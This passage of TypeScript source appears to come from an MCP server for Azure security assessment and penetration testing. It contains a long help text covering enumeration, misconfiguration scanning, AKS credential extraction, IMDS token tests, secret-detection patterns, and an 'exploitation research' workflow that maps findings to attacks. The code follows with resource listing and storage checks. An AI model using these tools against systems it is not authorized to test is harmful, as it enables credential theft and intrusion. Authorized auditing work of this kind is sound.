  - Discover all internet-facing resources
  - Identify external entry points for penetration testing
  - Find orphaned/unattached public IPs (cost + security risk)
  - Map DNS names to IP addresses
  - Locate resources by public IP allocation
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Returns:**
  - IP address and DNS name
  - Allocation method (Static/Dynamic)
  - Attached resource (VM, Load Balancer, App Gateway, etc.)
  - Resource group and location
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
**Attack Surface Info:** Allocated vs unallocated, DNS-enabled, attached resources

### 9. enumerate_rbac_assignments (NEW - Phase 1)
**Description:** List all role assignments (who has access to what)
**Use Cases:**
  - Identify privileged accounts (Owner, Contributor, User Access Admin)
  - Find service principals with excessive permissions
  - Discover potential privilege escalation paths
  - Audit access control configuration
  - Locate shared admin accounts
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - scope (optional): Specific scope (e.g., /subscriptions/{id}/resourceGroups/{rg})
**Returns:**
  - Principal type (User/ServicePrincipal/Group)
  - Role name and type (Owner/Contributor/Reader/Custom)
  - Scope level (Subscription/ResourceGroup/Resource)
  - Creation date and creator
**Example 1 - Subscription-wide:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
**Example 2 - Resource group:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  scope: "/subscriptions/1f0c8a8b-ad4a-4219-8190-a4968a4693ca/resourceGroups/RG-TMS-AKS-NCU-I"
**Security Focus:** Privileged roles, service principals, group memberships

### SECURITY SCANNING TOOLS (10-19)

### 10. scan_sql_databases
**Description:** Comprehensive SQL Database security scanner
**Use Cases:**
  - Check TDE encryption status
  - Audit firewall rules (detect 0.0.0.0-255.255.255.255 allow-all)
  - Verify Azure AD authentication vs SQL auth
  - Check auditing and threat detection status
  - Identify public endpoint exposure
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Security Checks:**
  - CRITICAL: Allow-all firewall, TDE encryption disabled
  - HIGH: Public endpoint + SQL auth, auditing disabled
  - MEDIUM: Threat detection disabled
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 11. check_key_vault_security
**Description:** Key Vault security assessment
**Use Cases:**
  - Check soft delete and purge protection
  - Verify public network access restrictions
  - Audit RBAC vs Access Policies
  - Check secret/certificate expiration
  - Validate diagnostic logging
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Security Checks:**
  - CRITICAL: Soft delete disabled, purge protection disabled
  - HIGH: Public network access enabled, expired secrets
  - MEDIUM: Diagnostic logging disabled
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 12. analyze_vm_security
**Description:** Virtual Machine security scanner
**Use Cases:**
  - Check OS/data disk encryption
  - Verify security extensions (Defender, Azure Monitor Agent)
  - Check boot diagnostics storage access
  - Audit patch management status
  - Validate Just-in-Time VM access
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 13. analyze_cosmos_db_security
**Description:** Cosmos DB security analyzer
**Use Cases:**
  - Check public network access
  - Audit firewall rules (IP restrictions)
  - Verify encryption at rest
  - Check automatic failover configuration
  - Validate backup retention policy
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 14. check_container_registries
**Description:** Azure Container Registry (ACR) security scanner
**Use Cases:**
  - Check admin user enabled (high risk)
  - Verify public network access
  - Check vulnerability scanning (Defender for Containers)
  - Audit content trust (image signing)
  - Check network rules and anonymous pull access
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 15. enumerate_managed_identities
**Description:** Enumerate all managed identities (system-assigned and user-assigned)
**Use Cases:**
  - Map passwordless authentication patterns
  - Identify identity role assignments
  - Find cross-subscription permissions
  - Discover privilege escalation paths
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Returns:**
  - Identity type, associated resources, role assignments, scope of access
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 16. enumerate_service_principals
**Description:** Enumerate all service principals (application identities)
**Use Cases:**
  - Identify over-privileged applications
  - Check credential expiration dates
  - Audit application permissions (Microsoft Graph API)
  - Find orphaned/unused SPNs
**Parameters:**
  - subscriptionId (required): Used for authentication context
**Returns:**
  - Service principal names, application IDs, credential expiration, permissions
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 17. scan_storage_containers
**Description:** Deep scan of storage containers and blobs
**Use Cases:**
  - List all containers and check public access
  - Enumerate blobs and detect sensitive files
  - Find backups, configs, keys (*.bak, web.config, *.pem, *.key, *.sql)
  - Identify SAS tokens and orphaned blobs
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - storageAccountName (optional): Scan specific storage account
  - maxBlobsPerContainer (optional): Limit per container (default: 100)
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 18. generate_security_report
**Description:** Generate comprehensive security assessment report (NEW: PDF/HTML/CSV export)
**Use Cases:**
  - Executive summary with risk statistics
  - Professional deliverable reports
  - Compliance framework mapping (CIS/NIST)
  - Export for Excel/data analysis
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - format (optional): "markdown", "json", "html", "pdf", "csv" (default: markdown)
  - outputFile (optional): Save to file (e.g., C:\\\\reports\\\\security.pdf)
  - fullScan (optional): Run all 25 tools (future feature)
  - includeRemediation (optional): Include fix guidance (default: true)
  - includeCompliance (optional): Include CIS/NIST mapping (default: true)
**Example - PDF Report:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  format: "pdf"
  outputFile: "C:\\\\reports\\\\azure-security-2025-12-07.pdf"
**Example - HTML Dashboard:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  format: "html"
  outputFile: "C:\\\\reports\\\\dashboard.html"
**Example - CSV for Excel:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  format: "csv"
  outputFile: "C:\\\\reports\\\\findings.csv"

### 19. analyze_attack_paths
**Description:** Map attack paths from public exposure to sensitive resources
**Use Cases:**
  - Identify privilege escalation chains (RBAC → resources)
  - Find lateral movement opportunities (VM → managed identity → secrets)
  - Trace exposed credentials to resource access
  - Map public IP → NSG → VM → identity → data flows
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - startFrom (optional): "public-ips", "storage", "vms", "identities", "all"
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  startFrom: "public-ips"

### KUBERNETES/AKS TOOLS (20-24)

### 20. scan_aks_clusters
**Description:** Azure Kubernetes Service (AKS) security assessment
**Use Cases:**
  - Check RBAC enabled
  - Verify network policies configured
  - Audit pod security policies
  - Check private cluster mode
  - Validate Azure Policy integration
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 21. get_aks_credentials
**Description:** Extract AKS cluster credentials and kubeconfig
**Use Cases:**
  - Obtain cluster access for kubectl
  - Get admin credentials (if available)
  - Extract service principal details
  - Retrieve managed identity info
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
  - adminAccess (optional): Get admin credentials (default: false)
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceGroup: "RG-TMS-AKS-NCU-I"
  clusterName: "tms-aks-cluster"

### 22. enumerate_aks_identities
**Description:** Enumerate AKS cluster identities and service principals
**Use Cases:**
  - Identify cluster managed identity
  - Find kubelet identity
  - Map identity role assignments
  - Check Key Vault and storage access
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceGroup: "RG-TMS-AKS-NCU-I"
  clusterName: "tms-aks-cluster"

### 23. scan_aks_node_security
**Description:** Scan AKS node (VM) security configuration
**Use Cases:**
  - Check OS disk encryption
  - Verify SSH access enabled
  - Check public IPs on nodes
  - Audit node pool configuration
  - Check auto-upgrade and security patches
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceGroup: "RG-TMS-AKS-NCU-I"
  clusterName: "tms-aks-cluster"

### 24. test_aks_imds_access
**Description:** Test Azure Instance Metadata Service (IMDS) accessibility from AKS
**Use Cases:**
  - Check if IMDS endpoint 169.254.169.254 is reachable
  - Test managed identity token retrieval
  - Validate network restrictions
  - Critical for pod escape attacks
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceGroup: "RG-TMS-AKS-NCU-I"
  clusterName: "tms-aks-cluster"

### DEVOPS TOOLS (25)

### 25. scan_azure_devops [NEW]
**Description:** Azure DevOps security scanner (Phase 5)
**Use Cases:**
  - Scan repositories for sensitive files (.env, secrets, credentials)
  - Find hardcoded passwords, API keys, connection strings in pipelines
  - Identify insecure service connections
  - Enumerate projects, repos, and pipelines
**Parameters:**
  - organizationUrl (required): Azure DevOps org URL (e.g., https://dev.azure.com/yourorg)
  - personalAccessToken (required): PAT with Code:Read, Build:Read permissions
  - scanRepositories (optional): Scan repos for secrets (default: true)
  - scanPipelines (optional): Scan pipelines for hardcoded creds (default: true)
**Detection Patterns:**
  - CRITICAL: password[:=], connectionString[:=], apiKey[:=]
  - HIGH: secret[:=], token[:=]
**Example:**
  organizationUrl: "https://dev.azure.com/your-organization"
  personalAccessToken: "YOUR_PAT_TOKEN"
  scanRepositories: true
  scanPipelines: true

---

## Professional Penetration Testing Workflow

### Phase 1: Reconnaissance & Asset Discovery
1. \`enumerate_subscriptions\` - Discover target scope and environments
2. \`enumerate_resource_groups\` - Map organizational structure
3. \`enumerate_resources\` - Complete asset inventory
4. \`enumerate_public_ips\` - Identify internet-exposed attack surface
5. \`enumerate_managed_identities\` - Map passwordless auth patterns
6. \`enumerate_service_principals\` - Find application identities

### Phase 2: Access Control Analysis
7. \`enumerate_rbac_assignments\` - Map permissions and identify privileged accounts
8. \`analyze_attack_paths\` - Trace privilege escalation chains
9. Look for: Service principals with Owner/Contributor, shared admin accounts

### Phase 3: Automated Security Assessment
10. \`analyze_storage_security\` - Scan all storage for misconfigurations
11. \`scan_storage_containers\` - Deep scan for sensitive files
12. \`analyze_nsg_rules\` - Identify network exposure and risky firewall rules
13. \`scan_sql_databases\` - Check database security
14. \`check_key_vault_security\` - Audit secrets management
15. \`analyze_vm_security\` - Check compute security
16. \`check_container_registries\` - Audit container security
17. \`analyze_cosmos_db_security\` - Check NoSQL database security

### Phase 4: Kubernetes/AKS Assessment
18. \`scan_aks_clusters\` - Check cluster security configuration
19. \`enumerate_aks_identities\` - Map cluster identities and permissions
20. \`scan_aks_node_security\` - Audit node security
21. \`test_aks_imds_access\` - Test for pod escape vulnerabilities
22. \`get_aks_credentials\` - Extract kubeconfig for manual testing

### Phase 5: DevOps Security
23. \`scan_azure_devops\` - Scan repos and pipelines for hardcoded secrets
24. Look for: passwords in YAML, API keys in variables, credentials in repos

### Phase 6: Reporting & Deliverables
25. \`generate_security_report\` - Create comprehensive assessment report
    - PDF format for executive stakeholders
    - HTML format for interactive dashboards
    - CSV format for tracking and remediation
    - Markdown/JSON for documentation and automation

### Phase 7: Exploitation Research
26. Cross-reference findings:
    - Public IP + Open SSH/RDP = Brute force target
    - Storage + Public access = Data exfiltration
    - NSG + Database port = Direct DB access
    - Service Principal + Owner role = Privilege escalation
    - AKS + IMDS accessible = Managed identity token theft
    - DevOps pipeline + hardcoded credentials = Supply chain attack

## Security Considerations

- **Authentication:** Uses DefaultAzureCredential (Azure CLI credentials)
- **Permissions Required:** Reader role or higher on target subscriptions
- **Audit Trail:** All API calls are logged in Azure Activity Logs
- **Scope:** Only enumerates resources you have permission to access
- **Rate Limits:** Azure API has rate limits; space out large enumerations

## Common Security Findings (CWE Mapped)

### Storage Security Issues
- **CWE-284:** Public blob access enabled (anonymous access)
- **CWE-319:** HTTP-only access (cleartext transmission)
- **CWE-327:** Weak TLS version (< TLS 1.2)
- **CWE-311:** Missing blob encryption
- **CWE-923:** No network restrictions (firewall disabled)

### Network Exposure Issues
- **CWE-749:** Management ports exposed (RDP 3389, SSH 22, WinRM 5985)
- **CWE-668:** Database ports exposed (SQL 1433, MySQL 3306, PostgreSQL 5432)
- **CWE-284:** Wildcard rules (0.0.0.0/0, *, Internet, Any)
- **CWE-923:** Missing private endpoints for sensitive services

### Access Control Issues
- **CWE-250:** Service principals with Owner/Contributor roles
- **CWE-266:** Overly broad RBAC assignments at subscription level
- **CWE-798:** Shared key access enabled (hard-coded credential risk)

## Tips

- Start with \`enumerate_subscriptions\` to get subscription IDs
- Use resource type filters to focus on specific service types
- Resource IDs follow format: /subscriptions/{sub}/resourceGroups/{rg}/providers/{provider}/{type}/{name}
- Check tags for environment info (Production, Development, Testing)
- Look for resources in unexpected regions (data residency concerns)

## Error Handling

Common errors and solutions:
- "Authentication failed" → Run \`az login\` in terminal
- "Subscription not found" → Verify subscription ID format
- "Resource not found" → Check resource group and name spelling
- "Insufficient permissions" → Request Reader or Contributor role

## Export Formats (NEW - Phase 5)

### Markdown (Default)
- Human-readable text format
- Best for: GitHub, VS Code, documentation
- Output: Plain text with markdown formatting

### JSON
- Structured data format
- Best for: API integration, automation, parsing
- Output: JSON object with findings array

### HTML [NEW]
- Interactive dashboard with styling
- Best for: Browser viewing, team sharing, stakeholders
- Features: Color-coded severity, sortable table, hover effects
- Output: Full HTML5 document with embedded CSS

### PDF [NEW]
- Professional deliverable report
- Best for: Executive presentations, client reports, compliance
- Features: Title page, metadata, executive summary, findings by category
- Output: PDF file (requires outputFile parameter)

### CSV [NEW]
- Excel-ready data export
- Best for: Data analysis, pivot tables, tracking remediation
- Features: Severity, Category, Resource, Finding columns
- Output: CSV file or text

**Export Examples:**
\`\`\`bash
# PDF report for management
generate_security_report subscriptionId="SUB" format="pdf" outputFile="C:\\\\report.pdf"

# HTML dashboard for team
generate_security_report subscriptionId="SUB" format="html" outputFile="C:\\\\dashboard.html"

# CSV for Excel analysis
generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\findings.csv"
\`\`\`

---

## Version: 1.9.0 (Multi-Location Scanning)
## Total Tools: 35
## Last Updated: January 2025

**Recent Updates:**
- [NEW] Multi-location scanning (list_active_locations, scan_all_locations)
- [NEW] Location filtering for enumerate_resource_groups, enumerate_resources
- [OK] Azure DevOps security scanning (scan_azure_devops)
- [OK] PDF/HTML/CSV report export formats
- [OK] Deep storage container scanning
- [OK] AKS offensive security tools (4 tools)
- [OK] Attack path analysis
- [OK] Managed identity enumeration

**Supported Locations:**
- Common (10): eastus, eastus2, westus2, westeurope, northeurope, southeastasia, australiaeast, uksouth, centralindia, japaneast
- All (45+): Full global coverage including Americas, Europe, Asia Pacific, Middle East, Africa

**Dependencies:**
- 201 npm packages installed
- 0 vulnerabilities detected
- Azure SDK v4+ for all services
- Azure DevOps API v13.2.0
- PDFKit, Marked, CSV-Writer for export formats
`;

        return {
          content: [
            {
              type: "text",
              text: helpText,
            },
          ],
        };
      }

      case "enumerate_subscriptions": {
        const client = new SubscriptionClient(credential);
        const subscriptions = [];
        
        for await (const sub of client.subscriptions.list()) {
          subscriptions.push({
            id: sub.subscriptionId,
            name: sub.displayName,
            state: sub.state,
            tenantId: sub.tenantId,
          });
        }

        return {
          content: [
            {
              type: "text",
              text: `# Azure Subscriptions\n\nFound ${subscriptions.length} subscription(s):\n\n${JSON.stringify(subscriptions, null, 2)}`,
            },
          ],
        };
      }

      case "list_active_locations": {
        const { subscriptionId, scanMode } = request.params.arguments as {
          subscriptionId: string;
          scanMode?: "common" | "all";
        };

        const locationsToCheck = scanMode === "all" ? AZURE_LOCATIONS : COMMON_LOCATIONS;
        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        const computeClient = new ComputeManagementClient(credential, subscriptionId);
        const storageClient = new StorageManagementClient(credential, subscriptionId);
        
        const locationSummary: Record<string, { resourceGroups: number; vms: number; storage: number; total: number }> = {};
        
        // Get all resources and group by location
        const allResources: Array<{ location?: string; type?: string }> = [];
        
        for await (const resource of resourceClient.resources.list()) {
          allResources.push({ location: resource.location, type: resource.type });
        }

        // Get resource groups
        const resourceGroups: Array<{ location?: string }> = [];
        for await (const rg of resourceClient.resourceGroups.list()) {
          resourceGroups.push({ location: rg.location });
        }

        // Count by location
        for (const loc of locationsToCheck) {
          const rgCount = resourceGroups.filter(rg => rg.location?.toLowerCase() === loc).length;
          const vmCount = allResources.filter(r => r.location?.toLowerCase() === loc && r.type === "Microsoft.Compute/virtualMachines").length;
          const storageCount = allResources.filter(r => r.location?.toLowerCase() === loc && r.type === "Microsoft.Storage/storageAccounts").length;
          const totalInLoc = allResources.filter(r => r.location?.toLowerCase() === loc).length;
          
          if (rgCount > 0 || totalInLoc > 0) {
            locationSummary[loc] = {
              resourceGroups: rgCount,
              vms: vmCount,
              storage: storageCount,
              total: totalInLoc
            };
          }
        }

        const activeLocations = Object.keys(locationSummary);
        const totalResources = allResources.length;

        let output = `# 🌍 Azure Active Locations Scan\n\n`;
        output += `**Subscription:** ${subscriptionId}\n`;
        output += `**Scan Mode:** ${scanMode || "common"} (${locationsToCheck.length} locations checked)\n`;
        output += `**Active Locations:** ${activeLocations.length}\n`;
        output += `**Total Resources:** ${totalResources}\n\n`;

        if (activeLocations.length > 0) {
          output += `## Active Locations\n\n`;
          output += `| Location | Resource Groups | VMs | Storage | Total Resources |\n`;
          output += `|----------|-----------------|-----|---------|----------------|\n`;
          
          for (const [loc, stats] of Object.entries(locationSummary).sort((a, b) => b[1].total - a[1].total)) {
            output += `| ${loc} | ${stats.resourceGroups} | ${stats.vms} | ${stats.storage} | ${stats.total} |\n`;
          }

          output += `\n## Quick Reference\n`;
          output += `Active locations: \`${activeLocations.join(", ")}\`\n`;
        } else {
          output += `⚠️ No resources found in checked locations.\n`;
          output += `Try scanning with scanMode: "all" for comprehensive coverage.\n`;
        }

        return {
          content: [{ type: "text", text: output }],
        };
      }

      case "scan_all_locations": {
        const { subscriptionId, resourceType, locations } = request.params.arguments as {
          subscriptionId: string;
          resourceType: "vms" | "storage" | "nsgs" | "aks" | "sql" | "keyvaults" | "public_ips" | "all";
          locations?: string;
        };

        const targetLocations = resolveLocations(locations || "common");
        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        
        // Collect all resources
        const allResources: Array<{ name?: string; type?: string; location?: string; id?: string; resourceGroup?: string }> = [];
        
        for await (const resource of resourceClient.resources.list()) {
          allResources.push({
            name: resource.name,
            type: resource.type,
            location: resource.location,
            id: resource.id,
            resourceGroup: resource.id?.split('/')[4]
          });
        }

        // Filter by location if specified
        const filteredResources = targetLocations 
          ? allResources.filter(r => r.location && targetLocations.includes(r.location.toLowerCase()))
          : allResources;

        // Filter by resource type
        const typeMap: Record<string, string> = {
          vms: "Microsoft.Compute/virtualMachines",
          storage: "Microsoft.Storage/storageAccounts",
          nsgs: "Microsoft.Network/networkSecurityGroups",
          aks: "Microsoft.ContainerService/managedClusters",
          sql: "Microsoft.Sql/servers",
          keyvaults: "Microsoft.KeyVault/vaults",
          public_ips: "Microsoft.Network/publicIPAddresses"
        };

        let results = filteredResources;
        if (resourceType !== "all") {
          results = filteredResources.filter(r => r.type === typeMap[resourceType]);
        }

        // Group by location
        const byLocation: Record<string, typeof results> = {};
        for (const r of results) {
          const loc = r.location || "unknown";
          if (!byLocation[loc]) byLocation[loc] = [];
          byLocation[loc].push(r);
        }

        // Build output
        let output = `# 🌍 Multi-Location Resource Scan\n\n`;
        output += `**Subscription:** ${subscriptionId}\n`;
        output += `**Resource Type:** ${resourceType}\n`;
        output += `**Locations Scanned:** ${targetLocations ? targetLocations.length : "all"}\n`;
        output += `**Total Found:** ${results.length}\n\n`;

        if (Object.keys(byLocation).length > 0) {
          for (const [loc, resources] of Object.entries(byLocation).sort((a, b) => b[1].length - a[1].length)) {
            output += `## 📍 ${loc} (${resources.length})\n\n`;
            
            if (resourceType === "all") {
              // Group by type
              const byType: Record<string, number> = {};
              for (const r of resources) {
                const t = r.type || "unknown";
                byType[t] = (byType[t] || 0) + 1;
              }
              for (const [t, count] of Object.entries(byType).sort((a, b) => b[1] - a[1])) {
                output += `- ${t}: ${count}\n`;
              }
            } else {
              for (const r of resources) {
                output += `- **${r.name}** (${r.resourceGroup})\n`;
              }
            }
            output += `\n`;
          }
        } else {
          output += `⚠️ No ${resourceType} resources found in specified locations.\n`;
        }

        return {
          content: [{ type: "text", text: output }],
        };
      }

      case "enumerate_resource_groups": {
        const { subscriptionId, location } = request.params.arguments as {
          subscriptionId: string;
          location?: string;
        };

        const client = new ResourceManagementClient(credential, subscriptionId);
        const resourceGroups = [];
        const targetLocations = resolveLocations(location);

        for await (const rg of client.resourceGroups.list()) {
          resourceGroups.push({
            name: rg.name,
            location: rg.location,
            id: rg.id,
            tags: rg.tags,
            provisioningState: rg.properties?.provisioningState,
          });
        }

        // Filter by location if specified
        const filtered = filterByLocation(resourceGroups, targetLocations);

        let output = `# Resource Groups in Subscription\n\n`;
        output += `Found ${filtered.length} resource group(s)`;
        if (location) output += ` in ${location}`;
        output += `:\n\n${JSON.stringify(filtered, null, 2)}`;

        return {
          content: [{ type: "text", text: output }],
        };
      }

      case "enumerate_resources": {
        const { subscriptionId, resourceGroup, resourceType, location } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          resourceType?: string;
          location?: string;
        };

        const client = new ResourceManagementClient(credential, subscriptionId);
        const resources = [];
        const targetLocations = resolveLocations(location);

        let filter = "";
        if (resourceType) {
          filter = `resourceType eq '${resourceType}'`;
        }

        if (resourceGroup) {
          for await (const resource of client.resources.listByResourceGroup(resourceGroup, { filter })) {
            resources.push({
              name: resource.name,
              type: resource.type,
              location: resource.location,
              id: resource.id,
              tags: resource.tags,
            });
          }
        } else {
          for await (const resource of client.resources.list({ filter })) {
            resources.push({
              name: resource.name,
              type: resource.type,
              location: resource.location,
              id: resource.id,
              resourceGroup: resource.id?.split('/')[4],
              tags: resource.tags,
            });
          }
        }

        // Filter by location if specified
        const filtered = filterByLocation(resources, targetLocations);

        const summary = filtered.reduce((acc, r) => {
          acc[r.type!] = (acc[r.type!] || 0) + 1;
          return acc;
        }, {} as Record<string, number>);

        let output = `# Azure Resources\n\n`;
        output += `Found ${filtered.length} resource(s)`;
        if (location) output += ` in ${location}`;
        output += `\n\n## Summary by Type:\n${JSON.stringify(summary, null, 2)}\n\n## Resources:\n${JSON.stringify(filtered, null, 2)}`;

        return {
          content: [{ type: "text", text: output }],
        };
      }

      case "get_resource_details": {
        const { subscriptionId, resourceGroup, resourceProvider, resourceType, resourceName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          resourceProvider: string;
          resourceType: string;
          resourceName: string;
        };

        const client = new ResourceManagementClient(credential, subscriptionId);
        
        // Use latest API version based on resource type
        const apiVersionMap: Record<string, string> = {
          "Microsoft.Network": "2024-03-01",
          "Microsoft.Compute": "2024-07-01",
          "Microsoft.Storage": "2023-05-01",
          "Microsoft.Sql": "2023-08-01-preview",
          "Microsoft.KeyVault": "2023-07-01",
          "Microsoft.ContainerService": "2024-09-01",
          "Microsoft.DocumentDB": "2024-11-15",
          "Microsoft.Web": "2024-04-01",
        };
        
        const apiVersion = apiVersionMap[resourceProvider] || "2024-03-01";

        const resource = await client.resources.get(
          resourceGroup,
          resourceProvider,
          "",
          resourceType,
          resourceName,
          apiVersion
        );

        return {
          content: [
            {
              type: "text",
              text: `# Resource Details\n\n${JSON.stringify(resource, null, 2)}`,
            },
          ],
        };
      }

      case "analyze_storage_security": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };

        const storageClient = new StorageManagementClient(credential, subscriptionId);
        const findings: any[] = [];
        const storageAccounts: any[] = [];

        // List storage accounts
        const accounts = resourceGroup 
          ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
          : storageClient.storageAccounts.list();

        for await (const account of accounts) {
          const accountFindings: any[] = [];
          let riskScore = 0;

          // Check public blob access
          if (account.allowBlobPublicAccess === true) {
            accountFindings.push({
              severity: "HIGH",
              finding: "Public blob access is ENABLED",
              description: "Blobs can be accessed anonymously without authentication",
              remediation: "Set allowBlobPublicAccess to false unless explicitly required",
              cve: "CWE-284: Improper Access Control",
            });
            riskScore += 30;
          }

          // Check HTTPS-only (secure transfer)
          if (account.enableHttpsTrafficOnly === false) {
            accountFindings.push({
              severity: "CRITICAL",
              finding: "HTTPS-only (secure transfer) is DISABLED",
              description: "Storage allows unencrypted HTTP traffic - data in transit is not protected",
              remediation: "Enable 'Secure transfer required' (enableHttpsTrafficOnly: true)",
              cve: "CWE-319: Cleartext Transmission of Sensitive Information",
            });
            riskScore += 40;
          }

          // Check minimum TLS version
          if (account.minimumTlsVersion !== "TLS1_2") {
            accountFindings.push({
              severity: "HIGH",
              finding: `Weak TLS version: ${account.minimumTlsVersion || "Not set (defaults to TLS 1.0)"}`,
              description: "Storage accepts outdated TLS versions vulnerable to attacks",
              remediation: "Set minimumTlsVersion to TLS1_2 or TLS1_3",
              cve: "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
            });
            riskScore += 25;
          }

          // Check network rules (firewall)
          if (!account.networkRuleSet || account.networkRuleSet.defaultAction === "Allow") {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No network restrictions configured",
              description: "Storage account is accessible from all networks (default: Allow)",
              remediation: "Configure network rules to restrict access to specific VNets/IPs",
              cve: "CWE-923: Improper Restriction of Communication Channel to Intended Endpoints",
            });
            riskScore += 15;
          }

          // Check if private endpoints exist
          const hasPrivateEndpoints = account.privateEndpointConnections && account.privateEndpointConnections.length > 0;
          if (!hasPrivateEndpoints && account.networkRuleSet?.defaultAction !== "Deny") {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No private endpoints configured",
              description: "Storage is accessed via public endpoint without private link",
              remediation: "Configure private endpoints for secure VNet-only access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 10;
          }

          // Check encryption
          if (!account.encryption || !account.encryption.services?.blob?.enabled) {
            accountFindings.push({
              severity: "CRITICAL",
              finding: "Blob encryption is NOT enabled",
              description: "Data at rest is not encrypted",
              remediation: "Enable encryption for blob service (enabled by default on new accounts)",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 50;
          }

          // Check shared key access
          if (account.allowSharedKeyAccess !== false) {
            accountFindings.push({
              severity: "LOW",
              finding: "Shared key access is enabled",
              description: "Storage keys can be used for authentication (consider Azure AD only)",
              remediation: "Set allowSharedKeyAccess to false and use Azure AD authentication",
              cve: "CWE-798: Use of Hard-coded Credentials",
            });
            riskScore += 5;
          }

          storageAccounts.push({
            name: account.name,
            resourceGroup: account.id?.split('/')[4],
            location: account.location,
            sku: account.sku?.name,
            kind: account.kind,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: accountFindings,
            securitySummary: {
              publicBlobAccess: account.allowBlobPublicAccess,
              httpsOnly: account.enableHttpsTrafficOnly,
              minTlsVersion: account.minimumTlsVersion,
              networkDefaultAction: account.networkRuleSet?.defaultAction,
              privateEndpoints: hasPrivateEndpoints ? account.privateEndpointConnections?.length : 0,
              blobEncryption: account.encryption?.services?.blob?.enabled,
              sharedKeyAccess: account.allowSharedKeyAccess,
            },
          });
        }

        // Sort by risk score
        storageAccounts.sort((a, b) => b.riskScore - a.riskScore);

        const criticalCount = storageAccounts.filter(a => a.riskLevel === "CRITICAL").length;
        const highCount = storageAccounts.filter(a => a.riskLevel === "HIGH").length;
        const mediumCount = storageAccounts.filter(a => a.riskLevel === "MEDIUM").length;

        return {
          content: [
            {
              type: "text",
              text: `# Storage Security Analysis\n\n## Summary\n- Total Storage Accounts: ${storageAccounts.length}\n- CRITICAL Risk: ${criticalCount}\n- HIGH Risk: ${highCount}\n- MEDIUM Risk: ${mediumCount}\n- LOW Risk: ${storageAccounts.length - criticalCount - highCount - mediumCount}\n\n## Detailed Findings\n\n${JSON.stringify(storageAccounts, null, 2)}`,
            },
          ],
        };
      }

      case "analyze_nsg_rules": {
        const { subscriptionId, resourceGroup, nsgName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          nsgName?: string;
        };

        const networkClient = new NetworkManagementClient(credential, subscriptionId);
        const nsgAnalysis: any[] = [];

        // High-risk ports for automated detection
        const managementPorts = [22, 3389, 5985, 5986, 5022]; // SSH, RDP, WinRM, WinRM-HTTPS, SQL AlwaysOn
